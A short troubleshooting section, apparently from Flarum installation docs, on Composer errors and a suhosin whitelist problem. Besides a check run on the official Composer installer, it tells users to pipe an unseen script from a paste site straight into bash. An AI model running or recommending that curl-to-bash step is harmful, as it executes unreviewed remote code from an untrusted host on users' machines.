## Troubleshooting

If you’re having a problem installing Flarum, check out the [Installation tag](http://discuss.flarum.org/t/installation) on the support forum. Someone might’ve had the same problem as you! If not, start a discussion and we’ll do our best to help.

## Errors

### `composer` doesn't output anything

Check what the issue by running `curl -s https://getcomposer.org/installer | php -- --check`.
If there are any errors shown, try doing what it suggests as a solution.

#### The suhosin.executor.include.whitelist setting is incorrect

If you get this message, try to follow the instructions on screen.
However, if you are unable, run the following command in the Flarum directory.

This command will not work on Windows.

```bash
curl -s https://paste.redevs.org/paste/3/raw | bash
``` 

Now, whenever you need to use composer, use `./composer` instead.
